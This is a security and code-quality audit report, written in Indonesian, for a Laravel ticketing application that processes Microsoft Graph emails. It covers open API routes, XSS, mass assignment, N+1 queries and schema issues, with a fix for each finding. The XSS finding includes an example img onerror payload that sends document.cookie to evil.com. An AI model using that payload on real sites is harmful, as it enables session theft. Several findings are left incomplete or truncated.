## 🔴 CRITICAL

### C-1 · Unauthenticated External API — Data Tiket Terbuka Publik

**File:** `routes/api.php` baris 454–456

```php
Route::get('/external/tickets', [TicketController::class, 'externalIndex']);
Route::get('/external/tickets/create', [TicketController::class, 'storeExternalQuery']);
Route::get('/external/tickets/{data}', [TicketController::class, 'storeExternal']); // ← method tidak ada
```

Ketiga route ini berada **di luar semua middleware group** — tidak ada session check, tidak ada API key.
Siapapun yang tahu URL `/api/external/tickets` dapat membaca seluruh data tiket perusahaan.
Route ketiga (`storeExternal`) merujuk ke method yang **tidak ada** di `TicketController` → akan
throw `BadMethodCallException` saat diakses (500 error terbuka).

**Dampak:** Data breach semua tiket + potential DoS pada route create.

---

### C-2 · XSS via Email HTML Body yang Di-inject Langsung ke DOM

**File:** `resources/views/ticket/show.blade.php` baris 1368 & 1375

```js
// baris 1368
return `<div class="email-html-body">${msg.message_html}</div>`;

// baris 1375
return `<div class="message-content">${msg.message_html}</div>`;
```

Email HTML dari Microsoft Graph disimpan **raw** ke DB
(`app/Services/StagingTicketService.php:139`, `EmailController` → `ticket_message.message_html`)
lalu dimasukkan langsung ke `innerHTML` tanpa sanitasi. Staging view aman karena
memakai `<iframe sandbox>`, tetapi ticket show page **tidak** memakai iframe.

**Skenario serangan:** Kirim email berisi:
```html
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```
Cookie/session admin langsung terkirim ke server attacker.

**Fix:** Gunakan `DOMPurify.sanitize(msg.message_html)` sebelum inject ke DOM,
atau tampilkan via `<iframe sandbox="allow-same-origin">` seperti staging view.

### C-3 · Mass Assignment — StagingTicket Model

**File:** `app/Models/StagingTicket.php` baris 29–31

```php
protected $fillable = [
    ...
    'validated_by',   // ← siapa yang approve
    'validated_at',   // ← kapan diapprove
    'ticket_id',      // ← link ke tiket mana

```

Field-field ini bisa di-set melalui `StagingTicket::create($request->all())` atau
`$staging->fill($request->all())` jika controller tidak memfilter input secara eksplisit.
User bisa mengklaim dirinya sebagai validator atau me-link staging ke tiket milik orang lain.

**Fix:** Pindahkan `validated_by`, `validated_at`, `ticket_id` keluar dari `$fillable` —
set hanya via method service (`StagingTicketService::approve()`).

### C-4 · Email HTML Disimpan Raw ke Database (Tanpa Sanitasi Server-side)

**File:** `app/Services/StagingTicketService.php:139`, `app/Http/Controllers/EmailController.php`

```php
'email_body_html' => $emailData['body_html'] ?? null,  // raw HTML dari Graph API
```

```php

```

HTML dari email eksternal disimpan tanpa HTMLPurifier atau sanitasi apapun sebelum masuk DB.
Ini adalah titik masuk permanen untuk payload XSS — bahkan jika frontend diperbaiki,
data berbahaya sudah tersimpan di DB.

**Fix:** Sanitasi dengan `HTMLPurifier` atau library equivalen sebelum `->create()`.

## 🔴 HIGH

### H-1 · N+1 Query di `TicketController::index()`

**File:** `app/Http/Controllers/TicketController.php` baris 117–126

```php
$ticketsData = $tickets->map(function($ticket) {
    $pendingCount = DB::table('ticket_confirmation')  // ← 1 query per tiket
        ->where('ticket_id', $ticket->ticket_id)
        ->where('status', 'pending')
        ->count();

    $pendingConfirmation = DB::table('ticket_confirmation')  // ← 1 query lagi per tiket
        ->where('ticket_id', $ticket->ticket_id)
        ->where('status', 'pending')
        ->first();
    ...
});
```

Dengan 200 tiket: **401 queries per request**. Akan terasa saat data mulai banyak.

**Fix:** Gunakan `withCount('confirmation')` dan `with(['confirmation' => fn($q) => $q->where('status','pending')])` pada query awal.

### H-4 · `env()` Dipakai Langsung di Controller, Bukan `config()`

**File:** `app/Http/Controllers/EmailController.php` — 14+ pemanggilan `env()`

```php

$clientSecret  = env('MS_CLIENT_SECRET');

```

Setelah `php artisan config:cache` dijalankan (wajib di production untuk performa),

### H-5 · Error Response Mengekspos Internal Detail ke Client

**File:** `app/Http/Controllers/TicketController.php:348`, puluhan tempat lain

```php
return response()->json([
    'success' => false,
    'message' => 'Failed to retrieve tickets',

```

### H-6 · Path Traversal Potential di Attachment Download

## 🟠 MEDIUM

### M-1 · Tidak Ada Rate Limiting di Seluruh Routes

Tidak ada `throttle` middleware di `routes/api.php`. Endpoint paling berisiko:
- `POST /api/email/process-inbox` → bisa spam processor
- `POST /api/email/send` → bisa dipakai kirim ribuan email perusahaan
- `POST /api/staging-tickets` → bisa flood DB

**Fix:** Tambahkan `throttle:60,1` (60 request/menit) di semua route group, lebih ketat untuk email endpoints.

---

### M-2 · Inline Image MIME Type Tidak Divalidasi Sebelum `data:` URI

**File:** `app/Http/Controllers/EmailController.php` — blok CID replacement

```php
$dataUri = "data:{$mimeType};base64,{$contentBytes}";
$html    = str_replace('cid:' . $cleanCid, $dataUri, $html);
```

Jika email mengandung attachment dengan `contentType: text/html`, dihasilkan:
```
data:text/html;base64,PHNjcmlwdD4...
```
Browser akan execute sebagai HTML/JS jika user klik link tersebut.

**Fix:** Whitelist MIME types yang diizinkan (`image/png`, `image/jpeg`, `image/gif`, `image/webp` saja).

---

### M-3 · `jarvies_status` Kolom `string` — Tidak Ada Validasi Enum di DB

**File:** `database/migrations/2025_10_16_080740_create_ticket_table.php:32`

```php
$table->string('jarvies_status')->nullable();
```

Saat ini ada nilai `'in process'` dan `'in proccess'` (typo double-c) di production
karena DB tidak mencegah nilai salah. Query by status bisa miss records.

**Fix:** Ubah ke `enum` atau tambahkan check constraint.

### M-4 · Response Format API Tidak Konsisten

Berbagai format response tersebar di codebase:

| Controller | Format |
|-----------|--------|
| EmailController | `{ status: 'done', processed: N }` |
| TicketController | `{ success: true, data: [...] }` |
| StagingTicketController | `{ success: true, message: '...' }` |
| Beberapa error 500 | `{ success: false, message: '...', error: '...' }` |

Frontend harus handle berbagai format — rawan bug, mempersulit debugging.

**Fix:** Buat `ApiResponse` helper class atau Trait dengan method `success()`, `error()`, `paginated()`.

### M-5 · `ticket_message` Tidak Ada Index pada Kolom `ticket_id`

Tabel `ticket_message` adalah tabel paling sering di-query (semua thread percakapan), tapi
tidak ada explicit index pada `ticket_id` di migration. Semua query pesan tiket adalah full table scan.

**Fix:** Tambahkan migration `$table->index('ticket_id')`.

### M-6 · `TicketMessage::sender()` Tidak Bisa Eager Load — N+1 Tersembunyi

**File:** `app/Models/TicketMessage.php:49–57`

```php
public function sender() {
    if ($this->sender_type === 'employee') {
        return $this->belongsTo(Employee::class, ...);
    } elseif ($this->sender_type === 'customer') {
        return $this->belongsTo(Customer::class, ...);
    }
    return null;
}
```

Method biasa (bukan property relationship) — tidak bisa di-`with('sender')`. Setiap
render thread dengan 50 pesan → 50+ query individual untuk sender.

**Fix:** Implementasi polymorphic relationship (`morphTo`) atau load sender secara terpisah dengan batch query.

### M-7 · `cc_emails` Validation Tidak Memvalidasi Isi Array

**File:** `app/Http/Controllers/StagingTicketController.php:150`

```php
'cc_emails' => 'nullable|string',  // hanya cek string, bukan array of valid emails
```

Bisa diisi dengan `"bukan_email_valid"` atau JSON invalid — akan tersimpan ke DB dan
menyebabkan error saat parsing untuk kirim email.

**Fix:**
```php
'cc_emails'   => 'nullable|array',
'cc_emails.*' => 'email|max:255',
```

### M-8 · HTTP GET Dipakai untuk Create Resource (External Ticket)

**File:** `routes/api.php:455`

```php
Route::get('/external/tickets/create', [TicketController::class, 'storeExternalQuery']);
```

GET tidak boleh memiliki side effects (RFC 7231 §4.3.1). Browser, proxy, dan CDN bisa
cache atau prefetch request ini, menyebabkan tiket terbuat tanpa sengaja.

**Fix:** Ubah ke `Route::post(...)`.

### L-2 · `man_days` — Tipe `float` di Migration vs `decimal:2` di Model Cast

**File migration:** `2025_10_16_080740` → `$table->float('man_days')`
**File model:** `app/Models/Ticket.php:50` → `'man_days' => 'decimal:2'`

`float` di MySQL memiliki precision issue (contoh: `1.1 + 2.2 = 3.3000000000000003`).
Untuk kalkulasi mandays yang masuk ke invoice/billing, ini berbahaya.

**Fix:** Ubah kolom DB ke `decimal(10, 2)`.
